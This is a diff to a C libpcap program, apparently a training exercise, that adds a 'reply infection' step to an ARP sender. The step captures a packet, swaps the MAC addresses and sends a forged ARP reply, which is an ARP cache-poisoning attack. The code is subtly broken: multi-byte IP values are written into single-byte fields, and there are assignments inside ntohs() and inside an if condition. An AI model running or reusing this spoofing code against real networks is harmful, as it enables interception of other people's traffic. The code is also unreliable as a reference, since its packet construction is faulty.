@@ -74,6 +74,8 @@ int main(int argc, char **argv)
       u_char send_buf[sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)] =  {0,};
       libnet_ethernet_hdr* eth_hdr = (libnet_ethernet_hdr*)send_buf;
 
+      //requset place
+
       // eth_hdr setting place
       // Destination Mac address
       send_buf[0] = 0xFF;
@@ -99,7 +101,6 @@ int main(int argc, char **argv)
           arp_hdr -> ar_hln = 0x06; // send_buf[18] = 0x06;
           arp_hdr -> ar_pln = 0x04; // send_buf[19] = 0x04;
           arp_hdr -> ar_op = htons(ARPOP_REQUEST); //send_buf[20] = 0x01, send_buf[21] = 0x00
-
 
           arp_hdr -> sender_HA[0] = send_buf[6]; //send_buf[22]
           arp_hdr -> sender_HA[1] = send_buf[7]; //send_buf[23]
@@ -132,47 +133,76 @@ int main(int argc, char **argv)
           arp_hdr -> target_ip[0] = htonl(dst_ip_hex);
           arp_hdr -> target_ip[1] = htons(dst_ip_hex);
 
-          for(int a = 42; a <=59; a++)
-          {
-              arp_hdr -> padding[a] = 0x00;
-          }
+
 
           pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
+
+
+          // ---- reply infection ---- //
+
+          struct pcap_pkthdr *h;
+          const u_char * p;
+          int res = pcap_next_ex(handle, &h, &p);
+          //if(res == 0){printf("No packet is sniffed..!!");break;}
+          //if(res == -1) break;
+
+          struct libnet_ethernet_hdr *ehP = (struct libnet_ethernet_hdr *)p;
+                  send_buf[0] = ehP->ether_shost[0];
+                  send_buf[1] = ehP->ether_shost[1];
+                  send_buf[2] = ehP->ether_shost[2];
+                  send_buf[3] = ehP->ether_shost[3];
+                  send_buf[4] = ehP->ether_shost[4];
+                  send_buf[5] = ehP->ether_shost[5];
+
+                  send_buf[6] = ehP->ether_dhost[0];
+                  send_buf[7] = ehP->ether_dhost[1];
+                  send_buf[8] = ehP->ether_dhost[2];
+                  send_buf[9] = ehP->ether_dhost[3];
+                  send_buf[10] = ehP->ether_dhost[4];
+                  send_buf[11] = ehP->ether_dhost[5];
+
+          struct libnet_arp_hdr_Saewook *ARP;
+          ARP = (struct libnet_arp_hdr_Saewook*)(p + sizeof(*ehP));
+          arp_hdr -> ar_op = ntohs((ARP -> ar_op) = ARPOP_REPLY);
+
+
+          arp_hdr -> sender_HA[0] = send_buf[6];
+          arp_hdr -> sender_HA[1] = send_buf[7];
+          arp_hdr -> sender_HA[2] = send_buf[8];
+          arp_hdr -> sender_HA[3] = send_buf[9];
+          arp_hdr -> sender_HA[4] = send_buf[10];
+          arp_hdr -> sender_HA[5] = send_buf[11];
+
+
+          arp_hdr -> target_HA[0] = ARP -> sender_HA[0];
+          arp_hdr -> target_HA[1] = ARP -> sender_HA[1];
+          arp_hdr -> target_HA[2] = ARP -> sender_HA[2];
+          arp_hdr -> target_HA[3] = ARP -> sender_HA[3];
+          arp_hdr -> target_HA[4] = ARP -> sender_HA[4];
+          arp_hdr -> target_HA[5] = ARP -> sender_HA[5];
+
+          pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
+
+
+
+
+
+
+        /*
+          if(eth_hdr -> ether_type = htons(ETHERTYPE_ARP) && arp_hdr -> ar_op = htons(ARPOP_REPLY))
+          {
+              arp_hdr -> sender_HA[0] = send_buf[6]; //send_buf[22]
+              arp_hdr -> sender_HA[1] = send_buf[7]; //send_buf[23]
+              arp_hdr -> sender_HA[2] = send_buf[8]; //send_buf[24]
+              arp_hdr -> sender_HA[3] = send_buf[9]; //send_buf[25]
+              arp_hdr -> sender_HA[4] = send_buf[10]; //send_buf[26]
+              arp_hdr -> sender_HA[5] = send_buf[11]; //send_buf[27]
+
+              arp_hdr -> sender_ip[0] = htonl(dst_ip_hex);
+              arp_hdr -> sender_ip[1] = htons(dst_ip_hex);
+          }*/
+
           return 0;
+
 }
-
-
-      /*
-
-      // ====== end the ether setting ====== //
-
-
-
-          arp_hdr -> sender_ip[0] = 0xc0; //send_buf[28]
-          arp_hdr -> sender_ip[1] = 0xa8; //send_buf[29]
-          arp_hdr -> sender_ip[2] = 0xdb; //send_buf[30]
-          arp_hdr -> sender_ip[3] = 0x02; //send_buf[31]
-
-          arp_hdr -> target_HA[0] = 0x00; //send_buf[32]
-          arp_hdr -> target_HA[1] = 0x00; //send_buf[33]
-          arp_hdr -> target_HA[2] = 0x00; //send_buf[34]
-          arp_hdr -> target_HA[3] = 0x00; //send_buf[35]
-          arp_hdr -> target_HA[4] = 0x00; //send_buf[36]
-          arp_hdr -> target_HA[5] = 0x00; //send_buf[37]
-
-          arp_hdr -> target_ip[0] = 0xc0; //send_buf[38]
-          arp_hdr -> target_ip[1] = 0xa8; //send_buf[39]
-          arp_hdr -> target_ip[2] = 0xdb; //send_buf[40]
-          arp_hdr -> target_ip[3] = 0x80; //send_buf[41]
-
-
-          for(int i = 42; i <= 59; i++)
-          {
-            arp_hdr -> padding[i] = 0x00;
-          }
-
-          pcap_sendpacket(handle, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
-          printf("%d", (sizeof(libnet_ethernet_hdr) + sizeof(libnet_arp_hdr_Saewook)));
-          */
-
 
